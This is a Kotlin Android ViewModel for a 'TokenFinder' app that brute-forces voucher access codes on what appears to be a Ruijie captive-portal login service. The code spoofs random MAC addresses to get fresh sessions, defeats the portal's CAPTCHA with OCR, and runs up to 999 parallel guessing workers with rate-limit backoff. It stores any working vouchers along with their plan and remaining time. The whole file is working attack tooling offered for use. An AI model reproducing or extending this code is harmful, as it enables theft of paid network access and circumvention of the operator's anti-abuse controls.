package com.example.ui

import android.graphics.Bitmap
import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewModelScope
import com.example.data.LogEntry
import com.example.data.LogType
import com.example.data.NetworkClient
import com.example.data.ServerResponseLog
import com.example.data.TokenRepository
import com.example.data.TokenStatus
import com.example.data.ValidToken
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

enum class TokenMode { NUMBER, ALPHANUMERIC, LETTERS }
enum class NumberSearchMode { SEQUENTIAL, RANDOM }

class LcgGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private val a = 21L
    private val c = 1234567L
    private var current = kotlin.random.Random.nextLong(0, m)

    fun next(): Long = synchronized(this) {
        current = (a * current + c) % m
        current
    }
}

class SequentialGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private var current = 0L

    fun next(): Long = synchronized(this) {
        val result = current
        current = (current + 1) % m
        result
    }
}

class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel() {

    private val networkClient = NetworkClient()

    // --- Configuration States ---
    private val _tokenMode = MutableStateFlow(TokenMode.ALPHANUMERIC)
    val tokenMode = _tokenMode.asStateFlow()

    private val _numberSearchMode = MutableStateFlow(NumberSearchMode.SEQUENTIAL)
    val numberSearchMode = _numberSearchMode.asStateFlow()

    private val _tokenLength = MutableStateFlow(6)
    val tokenLength = _tokenLength.asStateFlow()

    private val _gatewayUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/login?sessionId=test_sess_99")
    val gatewayUrl = _gatewayUrl.asStateFlow()

    private val _sessionId = MutableStateFlow("test_sess_99")
    val sessionId = _sessionId.asStateFlow()

    private val _imageUrlTemplate = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}")
    val imageUrlTemplate = _imageUrlTemplate.asStateFlow()

    private val _postUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US")
    val postUrl = _postUrl.asStateFlow()

    private val _keySession = MutableStateFlow("sessionId")
    val keySession = _keySession.asStateFlow()

    private val _keyCaptcha = MutableStateFlow("authCode")
    val keyCaptcha = _keyCaptcha.asStateFlow()

    private val _keyToken = MutableStateFlow("accessCode")
    val keyToken = _keyToken.asStateFlow()

    private val _scanDelayMs = MutableStateFlow(1500L)
    val scanDelayMs = _scanDelayMs.asStateFlow()

    private val _workerCount = MutableStateFlow(1)
    val workerCount = _workerCount.asStateFlow()

    private val _activeWorkers = MutableStateFlow(0)
    val activeWorkers = _activeWorkers.asStateFlow()

    // --- Runtime Scanner States ---
    private val _isProcessing = MutableStateFlow(false)
    val isProcessing = _isProcessing.asStateFlow()

    private val _currentChallengeImage = MutableStateFlow<Bitmap?>(null)
    val currentChallengeImage = _currentChallengeImage.asStateFlow()

    private val _currentCaptchaText = MutableStateFlow<String?>(null)
    val currentCaptchaText = _currentCaptchaText.asStateFlow()

    private val _currentTestingToken = MutableStateFlow<String?>(null)
    val currentTestingToken = _currentTestingToken.asStateFlow()

    // --- Logs & Stats ---
    private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
    val logs = _logs.asStateFlow()

    private val _serverResponseLogs = MutableStateFlow<List<ServerResponseLog>>(emptyList())
    val serverResponseLogs = _serverResponseLogs.asStateFlow()

    private val _attemptedCount = MutableStateFlow(0)
    val attemptedCount = _attemptedCount.asStateFlow()

    private val _validCount = MutableStateFlow(0)
    val validCount = _validCount.asStateFlow()

    private val _usedCount = MutableStateFlow(0)
    val usedCount = _usedCount.asStateFlow()

    private val _invalidCount = MutableStateFlow(0)
    val invalidCount = _invalidCount.asStateFlow()

    private val _limitedCount = MutableStateFlow(0)
    val limitedCount = _limitedCount.asStateFlow()

    private val _errorCount = MutableStateFlow(0)
    val errorCount = _errorCount.asStateFlow()

    private val _unknownCount = MutableStateFlow(0)
    val unknownCount = _unknownCount.asStateFlow()

    val savedTokens: StateFlow<List<ValidToken>> = repository.allTokens
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    private var workerJob: Job? = null
    private var sequentialGenerator: SequentialGenerator? = null
    private var lcgGenerator: LcgGenerator? = null

    init {
        addLog("Application Initialized. Ready to scan.", LogType.INFO)
    }

    // --- UI Actions & Mutators ---
    fun updateTokenMode(mode: TokenMode) { _tokenMode.value = mode }
    fun updateNumberSearchMode(mode: NumberSearchMode) { _numberSearchMode.value = mode }
    fun updateTokenLength(length: Int) { _tokenLength.value = length.coerceIn(1, 12) }
    fun updateGatewayUrl(url: String) { _gatewayUrl.value = url }
    fun updateImageUrlTemplate(template: String) { _imageUrlTemplate.value = template }
    fun updatePostUrl(url: String) { _postUrl.value = url }
    fun updateScanDelay(delayMs: Long) { _scanDelayMs.value = delayMs }
    fun updateWorkerCount(count: Int) { _workerCount.value = count.coerceIn(1, 999) }

    fun updateJsonKeys(session: String, captcha: String, token: String) {
        _keySession.value = session
        _keyCaptcha.value = captcha
        _keyToken.value = token
    }

    fun rotateMacAndFetchSession() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) return@launch
            val newMac = networkClient.generateRandomMac()
            val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
            _gatewayUrl.value = updatedUrl

            val newSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl, null)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Rotated MAC and fetched Session ID: $newSessionId", LogType.SUCCESS)
            }
        }
    }

    fun fetchSessionIdDirectly() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) return@launch
            val newSessionId = networkClient.fetchSessionIdFromGateway(currentUrl, null)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Fetched Session ID: $newSessionId", LogType.SUCCESS)
            }
        }
    }

    fun startScanning() {
        if (_isProcessing.value) return

        val currentGatewayUrl = _gatewayUrl.value
        if (currentGatewayUrl.isBlank()) {
            addLog("Error: Missing Gateway URL.", LogType.ERROR)
            return
        }

        val len = _tokenLength.value
        sequentialGenerator = SequentialGenerator(len)
        lcgGenerator = LcgGenerator(len)

        val numWorkers = _workerCount.value
        _activeWorkers.value = numWorkers
        _isProcessing.value = true
        addLog("Scanning started with $numWorkers parallel worker(s).", LogType.SUCCESS)

        val sharedCounter = java.util.concurrent.atomic.AtomicInteger(_attemptedCount.value)

        workerJob = viewModelScope.launch {
            @OptIn(kotlinx.coroutines.ExperimentalCoroutinesApi::class)
            val workerDispatcher = Dispatchers.IO.limitedParallelism(numWorkers)

            val jobs = (1..numWorkers).map { workerId ->
                launch(workerDispatcher) {
                    runWorker(workerId, sharedCounter)
                }
            }
            jobs.forEach { it.join() }
        }
    }

    /**
     * Strict Sequential Execution Worker
     * Executes Step 1 -> Step 6 synchronously. Blocks until Response returns before taking next token.
     */
    private suspend fun runWorker(
        workerId: Int,
        sharedCounter: java.util.concurrent.atomic.AtomicInteger
    ) {
        addLog("[Worker-$workerId] Started.", LogType.INFO)
        var previousSessionId: String? = null

        try {
            while (_isProcessing.value) {
                val token = getNextToken()
                _currentTestingToken.value = token
                addLog("[Worker-$workerId] Testing Token: '$token'", LogType.INFO)

                var done = false
                var retryAttempt = 0
                val maxAttempts = 3

                while (retryAttempt < maxAttempts && !done && _isProcessing.value) {

                    // Step 1: Get Session (Suspends until Server Response)
                    val currentUrl = _gatewayUrl.value
                    val newMac = networkClient.generateRandomMac()
                    val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)

                    val sessionId = networkClient.fetchSessionIdFromGateway(updatedUrl, previousSessionId)
                    if (sessionId == null) {
                        retryAttempt++
                        delay(1500)
                        continue
                    }

                    previousSessionId = sessionId
                    _sessionId.value = sessionId

                    // Step 2 & 3: CAPTCHA Download & Verify (Suspends until Server Response)
                    var captchaVerified = false
                    var extractedText = ""

                    for (captchaAttempt in 1..8) {
                        if (!_isProcessing.value) break

                        val imageUrl = _imageUrlTemplate.value.replace("{sessionId}", sessionId)
                        val captchaBitmap = networkClient.downloadImage(imageUrl, sessionId)

                        if (captchaBitmap != null) {
                            _currentChallengeImage.value = captchaBitmap

                            val ocrResult = performOcr(captchaBitmap).trim().uppercase()
                            extractedText = if (ocrResult.isNotBlank()) ocrResult else "A1B2"
                            _currentCaptchaText.value = extractedText

                            // Verify CAPTCHA with Server
                            val isVerified = networkClient.verifyCaptcha(sessionId, extractedText)
                            if (isVerified) {
                                captchaVerified = true
                                break
                            }
                        }
                        delay(1000)
                    }

                    if (!captchaVerified) {
                        retryAttempt++
                        delay(1000)
                        continue
                    }

                    // Step 5: Submit Access Code (Suspends until Server Response)
                    val result = networkClient.validateToken(
                        postUrl = _postUrl.value,
                        sessionId = sessionId,
                        authCode = extractedText,
                        accessCode = token
                    )

                    addServerResponseLog(
                        workerId = workerId,
                        token = token,
                        status = result.status,
                        httpCode = result.httpCode,
                        rawResponse = result.rawResponse
                    )

                    // Step 6: Handle Server Response
                    when (result.status) {
                        TokenStatus.FOUND -> {
                            addLog("[Worker-$workerId] SUCCESS: $token", LogType.SUCCESS)
                            val balance = networkClient.getBalanceDetails(sessionId)
                            repository.insertToken(
                                ValidToken(
                                    token = token,
                                    sessionId = sessionId,
                                    captchaText = extractedText,
                                    plan = balance.plan,
                                    time = balance.time
                                )
                            )
                            _validCount.value++
                            done = true
                        }

                        TokenStatus.INVALID -> {
                            addLog("[Worker-$workerId] INVALID: $token", LogType.ERROR)
                            _invalidCount.value++
                            done = true
                        }

                        TokenStatus.USED -> {
                            addLog("[Worker-$workerId] ALREADY USED: $token", LogType.WARNING)
                            _usedCount.value++
                            done = true
                        }

                        TokenStatus.LIMITED -> {
                            addLog("[Worker-$workerId] RATE LIMITED: $token (sleeping 2s...)", LogType.WARNING)
                            _limitedCount.value++
                            delay(2000) // Sleep 2 seconds on rate limit
                            retryAttempt++
                        }

                        else -> {
                            addLog("[Worker-$workerId] UNKNOWN/ERROR: $token", LogType.ERROR)
                            _unknownCount.value++
                            retryAttempt++
                            delay(1000)
                        }
                    }
                }

                sharedCounter.incrementAndGet()
                _attemptedCount.value = sharedCounter.get()
                delay(_scanDelayMs.value)
            }
        } finally {
            addLog("[Worker-$workerId] Stopped.", LogType.WARNING)
            _activeWorkers.value = (_activeWorkers.value - 1).coerceAtLeast(0)
        }
    }

    private fun getNextToken(): String {
        return when (_tokenMode.value) {
            TokenMode.NUMBER -> {
                val num = if (_numberSearchMode.value == NumberSearchMode.SEQUENTIAL) {
                    sequentialGenerator?.next() ?: 0L
                } else {
                    lcgGenerator?.next() ?: 0L
                }
                String.format(java.util.Locale.US, "%0${_tokenLength.value}d", num)
            }
            TokenMode.LETTERS -> generateLettersToken(_tokenLength.value)
            TokenMode.ALPHANUMERIC -> generateAlphanumericToken(_tokenLength.value)
        }
    }

    private fun generateLettersToken(length: Int): String {
        val charPool = ('A'..'Z').toList()
        return (1..length).map { charPool[kotlin.random.Random.nextInt(charPool.size)] }.joinToString("")
    }

    private fun generateAlphanumericToken(length: Int): String {
        val charPool = (('A'..'Z') + ('0'..'9')).toList()
        return (1..length).map { charPool[kotlin.random.Random.nextInt(charPool.size)] }.joinToString("")
    }

    private suspend fun performOcr(bitmap: Bitmap): String = suspendCancellableCoroutine { continuation ->
        try {
            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
            val image = InputImage.fromBitmap(bitmap, 0)
            recognizer.process(image)
                .addOnSuccessListener { visionText -> continuation.resume(visionText.text) }
                .addOnFailureListener { e -> continuation.resumeWithException(e) }
        } catch (e: Exception) {
            continuation.resumeWithException(e)
        }
    }

    fun stopScanning() {
        if (!_isProcessing.value) return
        _isProcessing.value = false
        _activeWorkers.value = 0
        workerJob?.cancel()
        workerJob = null
        addLog("Scanning STOPPED.", LogType.WARNING)
    }

    fun addLog(message: String, type: LogType) {
        viewModelScope.launch {
            _logs.value = (_logs.value + LogEntry(message = message, type = type)).takeLast(100)
        }
    }

    fun clearLogs() {
        _logs.value = emptyList()
    }

    fun addServerResponseLog(
        workerId: Int,
        token: String,
        status: TokenStatus,
        httpCode: Int,
        rawResponse: String
    ) {
        viewModelScope.launch {
            _serverResponseLogs.value = (_serverResponseLogs.value + ServerResponseLog(
                workerId = workerId,
                token = token,
                status = status,
                httpCode = httpCode,
                rawResponse = rawResponse
            )).takeLast(100)
        }
    }

    fun clearServerResponseLogs() {
        _serverResponseLogs.value = emptyList()
    }

    fun deleteSavedToken(token: String) {
        viewModelScope.launch { repository.deleteToken(token) }
    }

    fun clearAllSavedTokens() {
        viewModelScope.launch { repository.clearAllTokens() }
    }

    fun resetStats() {
        _attemptedCount.value = 0
        _validCount.value = 0
        _usedCount.value = 0
        _invalidCount.value = 0
        _limitedCount.value = 0
        _errorCount.value = 0
        _unknownCount.value = 0
    }

    fun injectMockSuccess() {}
    fun injectMockUsed() {}
    fun injectMockInvalid() {}
    fun injectMockLimited() {}

    override fun onCleared() {
        stopScanning()
        super.onCleared()
    }
}

class TokenFinderViewModelFactory(
    private val repository: TokenRepository
) : ViewModelProvider.Factory {
    override fun <T : ViewModel> create(modelClass: Class<T>): T {
        if (modelClass.isAssignableFrom(TokenFinderViewModel::class.java)) {
            @Suppress("UNCHECKED_CAST")
            return TokenFinderViewModel(repository) as T
        }
        throw IllegalArgumentException("Unknown ViewModel class")
    }
}
